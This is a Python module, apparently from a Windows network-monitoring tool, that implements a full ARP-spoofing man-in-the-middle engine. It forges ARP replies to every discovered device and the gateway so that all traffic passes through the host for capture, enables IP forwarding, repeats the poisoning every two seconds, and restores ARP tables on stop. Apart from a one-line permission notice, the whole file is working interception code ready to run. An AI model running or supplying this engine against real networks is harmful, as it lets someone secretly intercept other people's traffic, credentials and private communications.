"""
traffic/mitm.py — ARP MitM engine for full network traffic visibility.

Positions this machine between every discovered device and the gateway
so all traffic passes through here for capture by dumpcap. This is the
same technique used by network monitors like zAnti on switched networks.

How it works:
  1. Send ARP replies to each device:  "Gateway IP = MY MAC"
  2. Send ARP replies to the gateway:  "Device IP  = MY MAC"
  3. Enable Windows IP forwarding so packets reach their destination
  4. dumpcap captures all traffic flowing through this machine
  5. On stop: send 5 rounds of correct ARP to restore every device's table

MAC resolution strategy (Windows-safe):
  1. Parse Windows ARP cache (arp -a) — free, instant, no packets needed
  2. Fall back to Scapy srp() ARP probe with timeout for IPs not in cache

Requirements:
  - scapy (pip install scapy)
  - Npcap installed (already required for dumpcap)
  - Server running as Administrator (needed for raw ARP packet sending)

Only use on networks you own or have explicit permission to monitor.
"""

import re
import subprocess
import threading
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional

# Lazy import — Scapy takes ~1 second to import and shows console noise
_scapy_ok = False
_scapy_err = None

def _load_scapy():
    global _scapy_ok, _scapy_err
    if _scapy_ok:
        return True
    try:
        import logging, os
        logging.getLogger("scapy").setLevel(logging.CRITICAL)

        # Redirect Scapy's cache to NetMon's data dir to avoid permission
        # issues with the default ~/.cache/scapy location on Windows.
        _data_dir = os.path.join(os.path.dirname(__file__), "..", "data", "scapy_cache")
        os.makedirs(_data_dir, exist_ok=True)
        os.environ.setdefault("SCAPY_CACHE_DIR", os.path.abspath(_data_dir))

        # Also pre-create the default cache path in case Scapy ignores the env var
        _default_cache = os.path.expanduser(os.path.join("~", ".cache", "scapy"))
        try:
            os.makedirs(_default_cache, exist_ok=True)
        except Exception:
            pass

        from scapy.all import conf as _sc
        _sc.verb = 0       # suppress packet-level output
        _scapy_ok = True
        return True
    except ImportError as e:
        _scapy_err = f"scapy not installed: {e}. Run: pip install scapy"
        return False
    except Exception as e:
        _scapy_err = str(e)
        return False


# ── Helpers ────────────────────────────────────────────────────────────────────

_IP_RE  = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
_MAC_RE = re.compile(r'^([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}$', re.IGNORECASE)


def _norm_mac(raw: str) -> Optional[str]:
    """Normalise Windows dash-format or colon-format MAC; return None if invalid."""
    mac = raw.strip().replace("-", ":").lower()
    if _MAC_RE.match(mac) and mac != "ff:ff:ff:ff:ff:ff":
        return mac
    return None


def _get_arp_cache() -> Dict[str, str]:
    """
    Parse the Windows ARP cache (arp -a).
    Returns {ip: mac} for all dynamic/static entries.
    With 30+ active devices the cache will typically contain all of them.
    """
    cache: Dict[str, str] = {}
    try:
        r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.splitlines():
            parts = line.split()
            # Line format: "  192.168.1.x    aa-bb-cc-dd-ee-ff    dynamic"
            if len(parts) >= 2 and _IP_RE.match(parts[0]):
                mac = _norm_mac(parts[1])
                if mac:
                    cache[parts[0]] = mac
    except Exception as e:
        print(f"[mitm] ARP cache read error: {e}")
    print(f"[mitm] ARP cache: {len(cache)} entries")
    return cache


def _get_our_mac() -> Optional[str]:
    """
    Get this machine's primary MAC address using system tools.
    Avoids Scapy's get_if_hwaddr() which hangs on Windows Wi-Fi interfaces.
    """
    # Method 1: Python uuid module (fast, no subprocess)
    try:
        import uuid
        mac_int = uuid.getnode()
        mac = ":".join(f"{(mac_int >> (8 * i)) & 0xff:02x}" for i in range(5, -1, -1))
        if _MAC_RE.match(mac) and mac != "00:00:00:00:00:00":
            return mac
    except Exception:
        pass

    # Method 2: Parse ipconfig /all — works even without admin
    try:
        r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=5,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.splitlines():
            if "Physical Address" in line and ":" in line:
                raw = line.split(":")[-1].strip()
                # Windows shows as "AA-BB-CC-DD-EE-FF", fix extra dash parsing
                raw2 = line.split("Physical Address")[1].lstrip(" .:").strip()
                mac = _norm_mac(raw2)
                if mac and mac != "00:00:00:00:00:00":
                    return mac
    except Exception:
        pass

    return None


def _probe_mac(ip: str, iface: str) -> Optional[str]:
    """
    Send a single ARP who-has to resolve a MAC not in the cache.
    Uses Scapy srp() — requires admin + valid L2 interface.
    """
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=1, verbose=False,
        )
        for _, rcv in ans:
            mac = _norm_mac(rcv[ARP].hwsrc)
            if mac:
                return mac
    except Exception as e:
        print(f"[mitm] ARP probe {ip} error: {e}")
    return None


def _get_own_ips() -> set:
    """
    Return all IPv4 addresses assigned to this machine.
    Used to exclude ourselves from the MitM target list — poisoning our
    own entry achieves nothing and can cause traffic loops.
    """
    own = set()
    try:
        r = subprocess.run(
            ["powershell", "-Command",
             "Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress"],
            capture_output=True, text=True, timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        for line in r.stdout.splitlines():
            ip = line.strip()
            if ip and _IP_RE.match(ip):
                own.add(ip)
    except Exception:
        pass
    # Always exclude loopback
    own.add("127.0.0.1")
    return own


def _detect_gateway() -> Optional[str]:
    """Return the default gateway IP via PowerShell routing table."""
    try:
        r = subprocess.run(
            ["powershell", "-Command",
             "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | "
             "Sort-Object RouteMetric | Select-Object -First 1).NextHop"],
            capture_output=True, text=True, timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        gw = r.stdout.strip()
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    return None


def _set_ip_forwarding(enable: bool):
    """Enable or disable IP forwarding on all adapters (Windows)."""
    val = "Enabled" if enable else "Disabled"
    try:
        subprocess.run(
            ["powershell", "-Command",
             f"Get-NetAdapter | ForEach-Object {{ "
             f"Set-NetIPInterface -InterfaceIndex $_.InterfaceIndex "
             f"-Forwarding {val} -ErrorAction SilentlyContinue }}"],
            capture_output=True, timeout=12,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        print(f"[mitm] IP forwarding {val.lower()}.")
    except Exception as e:
        print(f"[mitm] IP forwarding change failed: {e}")


# ── Engine ─────────────────────────────────────────────────────────────────────

class MitmEngine:
    """
    Thread-safe ARP spoof engine.
    One instance is created at module load time (mitm_engine singleton).
    """

    def __init__(self):
        self._thread:     Optional[threading.Thread] = None
        self._stop_event  = threading.Event()
        self._lock        = threading.Lock()
        self._state: Dict = {
            "running":      False,
            "gateway_ip":   None,
            "interface":    None,
            "target_count": 0,
            "targets":      [],
            "active_count": 0,
            "started_at":   None,
            "error":        None,
        }

    # ── Public API ─────────────────────────────────────────────────────────────

    def start(
        self,
        interface:  str,
        targets:    List[str],
        gateway_ip: Optional[str] = None,
    ) -> Dict:
        with self._lock:
            if self._state["running"]:
                return {"status": "already_running"}

        if not _load_scapy():
            return {"status": "error", "message": _scapy_err}

        if not gateway_ip:
            gateway_ip = _detect_gateway()
        if not gateway_ip:
            return {"status": "error",
                    "message": "Could not detect gateway. Pass gateway_ip explicitly."}

        own_ips = _get_own_ips()
        targets = [t for t in targets if t and t != gateway_ip and t not in own_ips]
        if not targets:
            return {"status": "error", "message": "No target IPs to poison."}

        print(f"[mitm] Own IPs excluded from targets: {own_ips}")

        _set_ip_forwarding(True)

        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._spoof_loop,
            args=(interface, gateway_ip, targets),
            daemon=True,
            name="mitm-spoof",
        )
        self._thread.start()

        with self._lock:
            self._state.update({
                "running":      True,
                "gateway_ip":   gateway_ip,
                "interface":    interface,
                "target_count": len(targets),
                "targets":      list(targets),
                "active_count": 0,
                "started_at":   datetime.now(timezone.utc).isoformat(),
                "error":        None,
            })

        print(f"[mitm] Starting — gateway={gateway_ip}, {len(targets)} targets, iface={interface}")
        return {
            "status":       "started",
            "gateway_ip":   gateway_ip,
            "target_count": len(targets),
        }

    def stop(self) -> Dict:
        with self._lock:
            if not self._state["running"]:
                return {"status": "not_running"}

        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=15)

        _set_ip_forwarding(False)

        with self._lock:
            self._state["running"]    = False
            self._state["started_at"] = None

        print("[mitm] Stopped — ARP tables restored.")
        return {"status": "stopped"}

    def get_status(self) -> Dict:
        with self._lock:
            return dict(self._state)

    # ── Internal ───────────────────────────────────────────────────────────────

    def _spoof_loop(self, interface: str, gateway_ip: str, targets: List[str]):
        from scapy.all import ARP, Ether, sendp

        # Get our own MAC via system tools — avoids Scapy's get_if_hwaddr()
        # which hangs on Windows Wi-Fi NPF interfaces
        our_mac = _get_our_mac()
        if not our_mac:
            with self._lock:
                self._state["error"]   = "Cannot determine this machine's MAC address."
                self._state["running"] = False
            print("[mitm] Cannot get own MAC")
            return

        try:
            # ── Step 1: Build MAC map from ARP cache ──────────────────────────
            cache = _get_arp_cache()

            # Resolve gateway MAC
            gateway_mac = cache.get(gateway_ip) or _probe_mac(gateway_ip, interface)
            if not gateway_mac:
                with self._lock:
                    self._state["error"]   = f"Cannot resolve gateway MAC ({gateway_ip})"
                    self._state["running"] = False
                print(f"[mitm] Cannot resolve gateway MAC")
                return

            # Resolve target MACs — cache first, probe for misses
            target_macs: Dict[str, str] = {}
            for ip in targets:
                mac = cache.get(ip)
                if not mac:
                    mac = _probe_mac(ip, interface)
                if mac:
                    target_macs[ip] = mac
                else:
                    print(f"[mitm] Could not resolve MAC for {ip} — skipping")

            with self._lock:
                self._state["active_count"] = len(target_macs)

            print(f"[mitm] Poisoning {len(target_macs)}/{len(targets)} reachable targets (gw={gateway_ip} mac={gateway_mac}, us={our_mac})")

            if not target_macs:
                with self._lock:
                    self._state["error"]   = "Resolved 0 target MACs. Check: admin rights, correct interface, devices are online."
                    self._state["running"] = False
                return

            # ── Step 2: Build packet lists ────────────────────────────────────
            poison_pkts  = []
            restore_pkts = []
            for ip, mac in target_macs.items():
                # Poison: tell device "gateway is at our MAC"
                poison_pkts.append(
                    Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac,
                                         psrc=gateway_ip, hwsrc=our_mac)
                )
                # Poison: tell gateway "device is at our MAC"
                poison_pkts.append(
                    Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                  hwdst=gateway_mac,
                                                  psrc=ip, hwsrc=our_mac)
                )
                # Restore: correct MAC for device → gateway
                restore_pkts.append(
                    Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac,
                                          psrc=gateway_ip, hwsrc=gateway_mac)
                )
                # Restore: correct MAC for gateway → device
                restore_pkts.append(
                    Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                  hwdst=gateway_mac,
                                                  psrc=ip, hwsrc=mac)
                )

            # ── Step 3: Spoof loop — send every 2 seconds ─────────────────────
            while not self._stop_event.is_set():
                for pkt in poison_pkts:
                    sendp(pkt, iface=interface, verbose=False)
                self._stop_event.wait(2)

            # ── Step 4: Restore — 5 rounds ────────────────────────────────────
            print("[mitm] Restoring ARP tables…")
            for _ in range(5):
                for pkt in restore_pkts:
                    sendp(pkt, iface=interface, verbose=False)
                time.sleep(0.4)

        except Exception as e:
            with self._lock:
                self._state["error"]   = str(e)
                self._state["running"] = False
            print(f"[mitm] Spoof loop error: {e}")



# Global singleton
mitm_engine = MitmEngine()
